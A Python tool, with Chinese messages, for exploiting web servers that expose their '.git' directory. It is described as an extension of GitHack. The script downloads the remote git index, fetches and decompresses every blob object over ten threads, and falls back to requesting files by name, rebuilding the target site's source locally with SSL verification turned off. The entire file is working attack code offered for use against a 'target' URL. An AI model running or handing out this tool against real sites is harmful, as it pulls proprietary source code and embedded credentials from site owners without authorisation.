#!/usr/bin/env python  
# -*- encoding: utf-8 -*-  

import sys  
try:  
    import urllib2  
    import urlparse  
    import Queue  
except Exception as e:  
    import urllib.request as urllib2  
    import urllib.parse as urlparse  
    import queue as Queue  

import os  
import zlib  
import threading  
import re  
import time  
from lib.parser import parse  
import ssl  

context = ssl._create_unverified_context()  
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36'  

if len(sys.argv) == 1:  
    msg = """  
此脚本用于`.git`文件夹的泄露利用。By  52yao
在 LiJieJie 的GitHack基础上，添加了使用文件名下载的功能
  
使用方法： python gitleak.py http://www.target.com/.git/  
"""  
    print(msg)  
    sys.exit(0)  

class Scanner(object):  
    def __init__(self):  
        self.base_url = sys.argv[-1]  
        print('目标URL: ' + self.base_url)  
        self.file_base_url = self.base_url.rstrip('.git/')  
        print('文件基础URL: ' + self.file_base_url)  
        self.domain = urlparse.urlparse(sys.argv[-1]).netloc.replace(':', '_')  
        
        print('[+] 开始下载和解析index文件...')  
        try:  
            data = self._request_data(sys.argv[-1] + '/index')  
        except Exception as e:  
            print('[错误] 无法下载index文件: %s' % str(e))  
            exit(-1)  
        
        with open('index', 'wb') as f:  
            f.write(data)  
        
        if not os.path.exists(self.domain):  
            os.mkdir(self.domain)  
        
        self.dest_dir = os.path.abspath(self.domain)  
        self.queue = Queue.Queue()  
        
        for entry in parse('index'):  
            if "sha1" in entry.keys():  
                entry_name = entry["name"].strip()  
                if self.is_valid_name(entry_name):  
                    self.queue.put((entry["sha1"].strip(), entry_name))  
                    print('[+] %s' % entry['name'])  
  
        self.lock = threading.Lock()  
        self.thread_count = 10  
        self.STOP_ME = False  

    def is_valid_name(self, entry_name):  
        if entry_name.find('..') >= 0 or \
                entry_name.startswith('/') or \
                entry_name.startswith('\\') or \
                not os.path.abspath(os.path.join(self.domain, entry_name)).startswith(self.dest_dir):  
            print('[错误] 文件名不合法: %s' % entry_name)  
            return False  
        return True  

    @staticmethod  
    def _request_data(url):  
        print('[请求] {}'.format(url))  
        request = urllib2.Request(url, None, {'User-Agent': user_agent})  
        return urllib2.urlopen(request, context=context).read()  

    def _print(self, msg):  
        self.lock.acquire()  
        try:  
            print(msg)  
        finally:  
            self.lock.release()  

    def get_back_file(self):  
        while not self.STOP_ME:  
            try:  
                sha1, file_name = self.queue.get(timeout=0.5)  
            except Exception as e:  
                break  
            for i in range(3):  
                try:  
                    folder = '/objects/%s/' % sha1[:2]  
                    data = self._request_data(self.base_url + folder + sha1[2:])  
                    
                    try:  
                        data = zlib.decompress(data)  
                    except:  
                        self._print('[错误] 无法解压缩 %s' % file_name)  
                        continue  
                    
                    data = re.sub(b"blob \\d+\00", b'', data)  
                    target_dir = os.path.join(self.domain, os.path.dirname(file_name))  
                    os.makedirs(target_dir, exist_ok=True)  
                    
                    clean_file_name = re.sub(r'[<>:"/\\|?*]', '_', file_name)  
                    with open(os.path.join(target_dir, clean_file_name), 'wb') as f:  
                        f.write(data)  
                    self._print('[成功] 下载文件: %s' % clean_file_name)  
                    break  
                
                except urllib2.HTTPError as e:  
                    if '404' in str(e):  
                        self._print('[未找到] 使用SHA1下载失败，尝试使用文件名下载: %s' % file_name)  
                        try:  
                            direct_data = self._request_data(self.file_base_url + '/' + file_name)  
                            clean_file_name = re.sub(r'[<>:"/\\|?*]', '_', file_name)  
                            
                            target_dir = os.path.join(self.domain, os.path.dirname(file_name))  
                            os.makedirs(target_dir, exist_ok=True)  
                            
                            with open(os.path.join(target_dir, clean_file_name), 'wb') as f:  
                                f.write(direct_data)  
                            self._print('[成功] 使用文件名下载文件: %s' % clean_file_name)  
                            break  
                        except urllib2.HTTPError as direct_e:  
                            if '404' in str(direct_e):  
                                self._print('[未找到] 文件名下载失败: %s' % file_name)  
                            else:  
                                self._print('[错误] 使用文件名下载时出错: %s' % str(direct_e))  
                        except Exception as direct_exception:  
                            self._print('[错误] 使用文件名下载时出错: %s' % str(direct_exception))  
                    else:  
                        self._print('[错误] %s' % str(e))  
                except Exception as e:  
                    self._print('[错误] %s' % str(e))  
        self.exit_thread()  

    def exit_thread(self):  
        self.lock.acquire()  
        self.thread_count -= 1  
        self.lock.release()  

    def scan(self):  
        for i in range(self.thread_count):  
            t = threading.Thread(target=self.get_back_file)  
            t.start()  

if __name__ == '__main__':  
    s = Scanner()  
    s.scan()  
    try:  
        while s.thread_count > 0:  
            time.sleep(0.1)  
    except KeyboardInterrupt as e:  
        s.STOP_ME = True  
        time.sleep(1.0)  
        print('用户中断程序。')
